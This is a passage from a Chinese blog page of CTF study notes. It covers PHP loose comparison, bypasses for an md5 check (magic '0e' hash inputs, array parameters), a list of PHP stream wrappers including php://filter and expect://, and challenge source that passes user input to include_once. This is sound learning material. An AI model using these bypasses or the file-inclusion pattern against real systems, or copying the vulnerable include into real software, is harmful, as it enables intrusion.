@@ -1,0 +1,466 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web周报03 | M.Yのblog</title><meta name="author" content="M.Y"><meta name="copyright" content="M.Y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web周报03【黑夜无论怎样悠长，白昼总会到来。             ——莎士比亚】 学习记录php弱比较在 PHP 中，弱比较是指在比较两个不同类型的值时，PHP 会尝试将它们转换为相同的类型，然后再进行比较。这种类型转换可能导致一些意想不到的行为，因此了解弱比较的规则对于编写安全的 PHP 代码非常重要。 常见的弱比较场景1. 字符串和数字比较当一个字符串和一个数字进行比较时，PHP 会将">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web周报03">
+<meta property="og:url" content="http://czxh.top/2025/03/20/web%E5%91%A8%E6%8A%A503/index.html">
+<meta property="og:site_name" content="M.Yのblog">
+<meta property="og:description" content="Web周报03【黑夜无论怎样悠长，白昼总会到来。             ——莎士比亚】 学习记录php弱比较在 PHP 中，弱比较是指在比较两个不同类型的值时，PHP 会尝试将它们转换为相同的类型，然后再进行比较。这种类型转换可能导致一些意想不到的行为，因此了解弱比较的规则对于编写安全的 PHP 代码非常重要。 常见的弱比较场景1. 字符串和数字比较当一个字符串和一个数字进行比较时，PHP 会将">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67dbd62a88c538a9b5c1ec93.jpg">
+<meta property="article:published_time" content="2025-03-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-19T16:00:00.000Z">
+<meta property="article:author" content="M.Y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67dbd62a88c538a9b5c1ec93.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "web周报03",
+  "url": "http://czxh.top/2025/03/20/web%E5%91%A8%E6%8A%A503/",
+  "image": "https://pic1.imgdb.cn/item/67dbd62a88c538a9b5c1ec93.jpg",
+  "datePublished": "2025-03-19T16:00:00.000Z",
+  "dateModified": "2025-03-19T16:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "M.Y",
+      "url": "http://czxh.top/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://czxh.top/2025/03/20/web%E5%91%A8%E6%8A%A503/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: M.Y","link":"链接: ","source":"来源: M.Yのblog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web周报03',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><link rel="stylesheet" href="/css/progress_bar.css"><div id="myscoll"></div><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/pic/back22.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/pic/c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/ccc/"><i class="fa-fw fas fa-list"></i><span> 实验室</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic1.imgdb.cn/item/67dbd62a88c538a9b5c1ec93.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/pic/titlelogo.png" alt="Logo"><span class="site-name">M.Yのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">web周报03</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/ccc/"><i class="fa-fw fas fa-list"></i><span> 实验室</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web周报03</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-19T16:00:00.000Z" title="发表于 2025-03-20 00:00:00">2025-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-19T16:00:00.000Z" title="更新于 2025-03-20 00:00:00">2025-03-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-03-20 00:00:00&quot;}" hidden></div><h1 id="Web周报03"><a href="#Web周报03" class="headerlink" title="Web周报03"></a>Web周报03</h1><p><strong><em>【黑夜无论怎样悠长，白昼总会到来。             ——莎士比亚】</em></strong></p>
+<h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="php弱比较"><a href="#php弱比较" class="headerlink" title="php弱比较"></a>php弱比较</h3><p>在 PHP 中，弱比较是指在比较两个不同类型的值时，PHP 会尝试将它们转换为相同的类型，然后再进行比较。这种类型转换可能导致一些意想不到的行为，因此了解弱比较的规则对于编写安全的 PHP 代码非常重要。</p>
+<h4 id="常见的弱比较场景"><a href="#常见的弱比较场景" class="headerlink" title="常见的弱比较场景"></a>常见的弱比较场景</h4><h5 id="1-字符串和数字比较"><a href="#1-字符串和数字比较" class="headerlink" title="1. 字符串和数字比较"></a>1. 字符串和数字比较</h5><p>当一个字符串和一个数字进行比较时，PHP 会将字符串转换为数字。如果字符串的开头部分是数字，PHP 会使用这些数字进行比较；如果字符串不以数字开头，则会被转换为 0。</p>
+<p><strong>示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;123abc&quot;</span> == <span class="number">123</span>); <span class="comment">// true，因为 &quot;123abc&quot; 被转换为 123</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;abc123&quot;</span> == <span class="number">0</span>);   <span class="comment">// true，因为 &quot;abc123&quot; 被转换为 0</span></span><br></pre></td></tr></table></figure>
+<h5 id="2-布尔值比较"><a href="#2-布尔值比较" class="headerlink" title="2. 布尔值比较"></a>2. 布尔值比较</h5><p>当布尔值与其他类型比较时，PHP 会将其他类型转换为布尔值。非零数字和非空字符串会被转换为 <code>true</code>，而 0、空字符串、<code>null</code> 等会被转换为 <code>false</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="number">1</span>);       <span class="comment">// true，因为 1 转换为 true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">false</span> == <span class="number">0</span>);      <span class="comment">// true，因为 0 转换为 false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="string">&quot;abc&quot;</span>);   <span class="comment">// true，因为 &quot;abc&quot; 转换为 true</span></span><br></pre></td></tr></table></figure>
+<h5 id="3-数组比较"><a href="#3-数组比较" class="headerlink" title="3. 数组比较"></a>3. 数组比较</h5><p>当数组与其他类型比较时，如果另一个类型不是数组，则数组会被视为 <code>true</code>。因此，数组与非数组比较时，通常会得到 <code>false</code>，除非另一个类型是 <code>true</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>() == <span class="literal">false</span>); <span class="comment">// true，因为空数组被视为 false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>(<span class="number">1</span>) == <span class="literal">true</span>); <span class="comment">// true，因为非空数组被视为 true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>() == <span class="number">0</span>);     <span class="comment">// false，因为数组和数字比较时，数组被视为 true</span></span><br></pre></td></tr></table></figure>
+<h4 id="PHP-弱比较的具体规则"><a href="#PHP-弱比较的具体规则" class="headerlink" title="PHP 弱比较的具体规则"></a>PHP 弱比较的具体规则</h4><h5 id="1-比较运算符"><a href="#1-比较运算符" class="headerlink" title="1. 比较运算符 (==)"></a>1. 比较运算符 (<code>==</code>)</h5><p><code>==</code> 运算符会进行类型转换，具体规则如下：</p>
+<ul>
+<li>如果两个 operand 都是数字或字符串，执行标准比较。</li>
+<li>如果一个 operand 是字符串，另一个是数字，将字符串转换为数字，然后比较。</li>
+<li>如果其中一个 operand 是 <code>boolean</code>，将另一个 operand 转换为 <code>boolean</code>，然后比较。</li>
+<li>如果两个 operand 都是 <code>null</code>，则认为它们相等。</li>
+<li>如果其中一个 operand 是 <code>array</code>，另一个不是，则认为它们不相等。</li>
+</ul>
+<h5 id="2-严格比较运算符"><a href="#2-严格比较运算符" class="headerlink" title="2. 严格比较运算符 (===)"></a>2. 严格比较运算符 (<code>===</code>)</h5><p><code>===</code> 运算符不会进行类型转换，只有当两个 operand 的类型和值都相同时，才认为它们相等。</p>
+<p><strong><em>例题：[SWPUCTF 2021 新生赛]easy_md5（NSSCTF）</em></strong></p>
+<p><img src="https://pic1.imgdb.cn/item/67dd33d488c538a9b5c2e2af.png" alt=""></p>
+<p>仔细阅读代码发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>既要两变量个值不相同，又要两个变量md5值一样，<br> 可以发现此时判断md5值是否一样用的是<code>==</code>，这是php的弱类型比较，<br> <strong>方法一：</strong> 可以使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等，而两个变量值不相等；<br> <strong>方法二：</strong> 可以传递数组，如name[]=123,password[]=456，md5不能加密数组，故两个md5返回的都是null</p>
+<p>另：若遇到<code>===</code>这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同</p>
+<p>另：0e开头的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s214587387a</span><br><span class="line"> 0e848240448830537924465865611904</span><br><span class="line"> s214587387a</span><br><span class="line"> 0e848240448830537924465865611904</span><br><span class="line"> s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1184209335a</span><br><span class="line"> 0e072485820392773389523109082030</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s532378020a</span><br><span class="line"> 0e220463095855511507588041205815</span><br><span class="line"> s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s214587387a</span><br><span class="line"> 0e848240448830537924465865611904</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> 240610708</span><br><span class="line"> 0e462097431906509019562988736854</span><br><span class="line"> 314282422</span><br></pre></td></tr></table></figure>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="1-file"><a href="#1-file" class="headerlink" title="1. file://"></a>1. <code>file://</code></h4><ul>
+<li><strong>用途</strong>：访问本地文件系统。</li>
+<li><strong>示例</strong>：<code>file:///path/to/file.txt</code>。</li>
+</ul>
+<h4 id="2-http-和-https"><a href="#2-http-和-https" class="headerlink" title="2. http:// 和 https://"></a>2. <code>http://</code> 和 <code>https://</code></h4><ul>
+<li><strong>用途</strong>：访问 HTTP(S) 网址。</li>
+<li><strong>示例</strong>：<code>http://example.com</code>。</li>
+</ul>
+<h4 id="3-ftp-和-ftps"><a href="#3-ftp-和-ftps" class="headerlink" title="3. ftp:// 和 ftps://"></a>3. <code>ftp://</code> 和 <code>ftps://</code></h4><ul>
+<li><strong>用途</strong>：访问 FTP(S) URLs。</li>
+<li><strong>示例</strong>：<code>ftp://example.com/file.txt</code>。</li>
+</ul>
+<h4 id="4-php"><a href="#4-php" class="headerlink" title="4. php://"></a>4. <code>php://</code></h4><ul>
+<li><strong>用途</strong>：访问各个输入/输出流（I/O streams）。</li>
+<li><strong>子协议</strong>：<ul>
+<li><code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>：分别代表标准输入、输出和错误输出流。</li>
+<li><code>php://input</code>：允许访问原始的POST数据。</li>
+<li><code>php://memory</code> 和 <code>php://temp</code>：用于访问内存或临时文件系统，适用于处理临时数据。</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-php-filter"><a href="#5-php-filter" class="headerlink" title="5. php://filter"></a>5. <code>php://filter</code></h4><ul>
+<li><strong>用途</strong>：在数据流打开时应用过滤器，常用于读取文件源码。</li>
+<li><strong>示例</strong>：<code>php://filter/read=convert.base64-encode/resource=example.txt</code>。</li>
+</ul>
+<h4 id="6-data"><a href="#6-data" class="headerlink" title="6. data://"></a>6. <code>data://</code></h4><ul>
+<li><strong>用途</strong>：内联数据流（RFC 2397），允许将字符串作为文件内容来访问。</li>
+<li><strong>示例</strong>：<code>data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==</code>。</li>
+</ul>
+<h4 id="7-zip"><a href="#7-zip" class="headerlink" title="7. zip://"></a>7. <code>zip://</code></h4><ul>
+<li><strong>用途</strong>：访问 ZIP 压缩文件中的具体文件，无需解压整个压缩包。</li>
+<li><strong>示例</strong>：<code>zip://path/to/archive.zip/file.txt</code>。</li>
+</ul>
+<h4 id="8-glob"><a href="#8-glob" class="headerlink" title="8. glob://"></a>8. <code>glob://</code></h4><ul>
+<li><strong>用途</strong>：查找匹配的文件路径模式。</li>
+<li><strong>示例</strong>：<code>glob://*.txt</code>。</li>
+</ul>
+<h4 id="9-phar"><a href="#9-phar" class="headerlink" title="9. phar://"></a>9. <code>phar://</code></h4><ul>
+<li><strong>用途</strong>：访问 PHP 归档文件（PHAR）。</li>
+<li><strong>示例</strong>：<code>phar://path/to/archive.phar/file.php</code>。</li>
+</ul>
+<h4 id="10-ssh2"><a href="#10-ssh2" class="headerlink" title="10. ssh2://"></a>10. <code>ssh2://</code></h4><ul>
+<li><strong>用途</strong>：通过 SSH2 协议访问资源。</li>
+<li><strong>示例</strong>：<code>ssh2.sftp://user:pass@example.com/path/to/file</code>。</li>
+</ul>
+<h4 id="11-rar"><a href="#11-rar" class="headerlink" title="11. rar://"></a>11. <code>rar://</code></h4><ul>
+<li><strong>用途</strong>：访问 RAR 压缩包。</li>
+<li><strong>示例</strong>：<code>rar://path/to/archive.rar/file.txt</code>。</li>
+</ul>
+<h4 id="12-ogg"><a href="#12-ogg" class="headerlink" title="12. ogg://"></a>12. <code>ogg://</code></h4><ul>
+<li><strong>用途</strong>：访问 OGG 音频流。</li>
+<li><strong>示例</strong>：<code>ogg://path/to/file.ogg</code>。</li>
+</ul>
+<h4 id="13-expect"><a href="#13-expect" class="headerlink" title="13. expect://"></a>13. <code>expect://</code></h4><ul>
+<li><strong>用途</strong>：处理交互式流。</li>
+<li><strong>示例</strong>：<code>expect://command</code>。</li>
+</ul>
+<p><strong><em>例题：[SWPUCTF 2021 新生赛]include（NSSCTF）</em></strong></p>
+<p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure>
+<p>发现有include_once函数；</p>
